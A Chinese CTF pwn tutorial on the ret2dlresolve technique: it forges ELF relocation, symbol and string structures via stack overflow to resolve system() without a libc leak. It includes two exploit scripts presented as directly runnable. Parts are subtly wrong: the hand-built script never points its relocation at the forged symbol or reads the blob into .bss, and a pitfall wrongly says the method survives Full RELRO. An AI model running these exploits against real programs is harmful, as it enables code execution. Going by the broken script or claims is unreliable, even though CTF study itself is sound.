---
title: ret2dlresolve —— 无 libc 泄露时伪造动态链接解析结构拿 system
category: pwn
tags: [ret2dlresolve, 动态链接, PLT/GOT, 懒绑定, 栈溢出]
signals: [程序里既没有 system 也没有 syscall, checksec 显示 Partial RELRO 或 No RELRO, 没有格式化字符串也没有 UAF 泄露点, 只导入 read 和 write 两个函数, 溢出长度足够写到 bss 或 栈上, 32 位 i386 且无 PIE 的老题]
difficulty: hard
source: "CTF-Wiki ret2dlresolve / pwntools pwnlib.rop.ret2dlresolve"
tools: [pwntools, gdb, pwndbg, readelf, objdump, ROPgadget]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

- `objdump -d` / `strings` 里**找不到** `system`、`execve`，只有 `read`、`write`。
- 没有任何泄漏 libc 的机会（无 `write(1, addr, n)` 任意读、无格式化字符串、无 UAF 残留指针），**ret2libc 走不通**。
- `checksec` 显示 `Partial RELRO` 或 `No RELRO`（`Full RELRO` 会把 `.dynamic` 置只读，需要换思路）。
- 存在**栈溢出**，可控长度足够大：32 位约需 `0x60` 字节，64 位约需 `0x100+` 字节来放伪造结构。
- 典型源码：`char buf[0x20]; read(0, buf, 0x200);`，且 `buf` 后的返回地址可覆盖。
- 32 位无 PIE 老题最常见 —— `reloc_arg` 越界后低 32 位地址好算。

## 二、原理

### 1. 延迟绑定（lazy binding）流程

首次调用 `read@plt` 时实际执行：

```asm
; 32-bit
read@plt:
    jmp  dword ptr [read@got]     ; 初始指向下面那条 push
    push 0x0                      ; reloc_arg = 重定位项索引
    jmp  plt0                     ; jmp [GOT+4] → _dl_runtime_resolve
```

`_dl_runtime_resolve(link_map, reloc_arg)` 最终走 `_dl_fixup`：

```c
/* elf/dl-runtime.c 简化版 */
const PLTREL *reloc  = JMPREL + reloc_arg * sizeof(PLTREL);
const char   *strtab = (const char *)D_PTR(l, l_info[DT_STRTAB]);
const ElfW(Sym) *sym = &symtab[ELFW(R_SYM)(reloc->r_info)];
const char   *name   = strtab + sym->st_name;

return elf_machine_fixup_plt(l, result, reloc, RELOC_ADDR, sym->st_value);
```

关键：**`reloc` / `sym` / `name` 三个指针全由 `reloc_arg` 算术推导**，解析结果写回 `reloc->r_offset` 指向的地址。

### 2. 三种攻击面

| 手法 | 需要控制 | 适用条件 |
| --- | --- | --- |
| **纯 `reloc_arg` 越界** | 只改 `push` 立即数，伪造 `Rela` 放到 `.bss` | `.bss` 可写可注入，`.rel.plt` 地址已知 |
| **改 `DT_STRTAB`** | `.dynamic` 里的 `DT_STRTAB` 指向假字符串表 | 有任意写（格式化字符串 / 堆），且 `Partial RELRO` |
| **改 `l_info[DT_STRTAB]`** | libc 内 `link_map` 字段 | 已泄露 libc 且有任意写（那时一般有更直接的路） |

CTF 里最常见的是第一种：配合一次 `read(0, bss, n)` 把伪造结构读进去。

### 3. 结构体布局

```c
/* 32 位 */
typedef struct { Elf32_Addr r_offset; Elf32_Word r_info; } Elf32_Rel;       // 8 字节
typedef struct { Elf32_Word st_name; Elf32_Addr st_value; Elf32_Word st_size;
                 Elf32_Byte st_info, st_other; Elf32_Half st_shndx; } Elf32_Sym; // 16 字节

/* 64 位 */
typedef struct { Elf64_Addr r_offset; Elf64_Xword r_info; Elf64_Sxword r_addend; } Elf64_Rela; // 24 字节
typedef struct { Elf32_Word st_name; Elf32_Byte st_info, st_other; Elf32_Half st_shndx;
                 Elf64_Addr st_value; Elf64_Xword st_size; } Elf64_Sym;              // 24 字节
```

- `r_offset` = 解析结果写回地址（可写即可）。
- `r_info` = `(sym_idx << 8) | 7`（32 位 `R_386_JMP_SLOT`）/ `(sym_idx << 32) | 7`（64 位 `R_X86_64_JUMP_SLOT`）。
- `st_name` = 相对 `DT_STRTAB` 的偏移，**不能为 0**。

## 三、解题步骤

1. **checksec**
```bash
checksec --file=./pwn     # 期望 Partial RELRO / NX / No PIE
```
2. **量出溢出偏移**
```bash
cyclic 200 | ./pwn
pytest -q  # 或直接用 pwntools
python -c "from pwn import *;print(cyclic_find(0x6261616b))"   # → OFFSET
```
3. **确认 `.bss` 地址**：`readelf -S ./pwn | grep -E '\.bss|\.got'`，选一个不覆盖 GOT 的地址，如 `elf.bss()+0x400`。
4. **算 `reloc_arg`**：
```python
jmprel = elf.get_section_by_name('.rel.plt').header.sh_addr
reloc_arg = (data_addr - jmprel) // 8       # 32 位
```
5. **两段式 payload**：第一段覆盖返回地址 `[ret：plt0, reloc_arg]`，第二段把伪造结构发到 `data_addr`。
6. **本地跑通再 remote**。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# checksec: Partial RELRO / NX / No PIE · x86 (i386)
from pwn import *

context.log_level = 'info'
context.arch = 'i386'                 # 决定 p32/p64 与 flat 的默认宽度

elf    = ELF('./pwn', checksec=False)
OFFSET = 0x6C                         # 溢出到返回地址（用 cyclic 量出来）
data   = elf.bss() + 0x400            # 伪造结构落地地址（避开 GOT）
plt0   = elf.get_section_by_name('.plt').header.sh_addr
jmprel = elf.get_section_by_name('.rel.plt').header.sh_addr

def start():
    return remote('HOST', 1337) if args.REMOTE else process(elf.path)

# ---- 1. 伪造 Elf32_Rel / Elf32_Sym / 字符串 ----
reloc_arg = (data - jmprel) // 8                # 让 jmprel + arg*8 == data
reloc = p32(data + 0x40) + p32((0 << 8) | 7)    # r_offset / r_info(sym_idx=0)

# st_name 相对 DT_STRTAB 的偏移；这里把字符串放在 data+0x60
# 32 位 Elf32_Sym 布局：st_name, st_value, st_size, st_info, st_other, st_shndx
sym = p32(0x60) + p32(0) + p32(0) + p8(0) * 4 + p16(0)

blob = flat({
    0x00: reloc,            # Elf32_Rel 位于 data
    0x60: b'system\x00',    # st_name → 这里
    0x80: sym,              # Elf32_Sym
}, length=0x100, filler=b'\x00')

# ---- 2. 两段式发送 ----
io = start()
io.sendline(flat({OFFSET: [plt0, reloc_arg]}))   # part1：返回地址 → plt0 + 越界 arg
io.send(blob)                                     # part2：伪造结构写到 data
io.interactive()
```

### 更稳的版本：交给 pwntools 自动算

```python
from pwn import *

elf    = ELF('./pwn')
OFFSET = 0x6C
data   = elf.bss() + 0x400

io = process(elf.path)

rop = ROP(elf)
rop.read(0, data, 0x100)                          # 先把伪造结构读进 .bss

d = Ret2dlresolvePayload(elf, symbol='system',
                         args=[b'/bin/sh'], data_addr=data)
rop.ret2dlresolve(d)                              # 自动拼 plt0 + reloc_arg

io.send(flat({OFFSET: rop.chain()}))
io.send(d.payload)
io.interactive()
```

> `Ret2dlresolvePayload` 会在 `data_addr` 起依次排布 `Rela / Sym / strtab / binsh / system\0`，
> 顺序由它内部决定，不要手动改；`data_addr` 需 4 字节对齐且在 `.bss` 可写区间内。

## 五、常见坑 / 变体

1. **Full RELRO**：`.dynamic` 只读，「改 `DT_STRTAB`」路线被封；但**纯 `reloc_arg` 越界**依然可用，因为它不碰 `.dynamic`。
2. **`st_name == 0` 要避免**：部分实现会退化到 `ELF_R_TYPE` 分支并报错，务必让字符串表偏移非 0。
3. **`reloc_arg` 是 unsigned 且参与乘法**：`arg * sizeof(PLTREL)` 过大时会回绕，选 `data` 地址时注意不要让算术溢出。
4. **`plt0` 不是 `plt['read']`**：它是 `.plt` 段起始地址（`readelf -S` 的 `.plt` Address）。
5. **64 位栈对齐**：`_dl_runtime_resolve` 内有 `movaps`，进入时 `rsp % 16 != 0` 直接 SIGSEGV；手写要在 `plt0` 前补一个 `ret`。
6. **64 位 `Elf64_Rela` 的 `r_addend` 不能省略**（24 字节，不是 16）。
7. **新版 glibc 的 `DT_STRTAB` 是相对 `l_addr` 的**，伪造表时要叠加 `l_addr`；pwntools 已适配，但仍需同版本 libc 测试。
8. **变体：与 `SROP` 组合** —— 若找不到 `read` 的 PLT，可先 `sigreturn` 拿 `execve` 再读结构。
9. **变体：ret2dlresolve + 格式化字符串** —— 若同时有格式化字符串，可先写 `DT_STRTAB` 到 `.bss`，`reloc_arg` 就只需改很小的值。

## 六、参考来源

- [CTF-Wiki: ret2dlresolve](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/)
- [pwntools: pwnlib.rop.ret2dlresolve](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html)
- [pwntools: ROP 模块](https://docs.pwntools.com/en/stable/rop/rop.html)
- [glibc 源码: elf/dl-runtime.c（_dl_fixup / _dl_runtime_resolve）](https://github.com/bminor/glibc/blob/master/elf/dl-runtime.c)
- [glibc 源码（bootlin 交叉索引）](https://elixir.bootlin.com/glibc/latest/source/elf/dl-runtime.c)
- [CTF Wiki 英文镜像仓库](https://github.com/mahaloz/ctf-wiki-en)
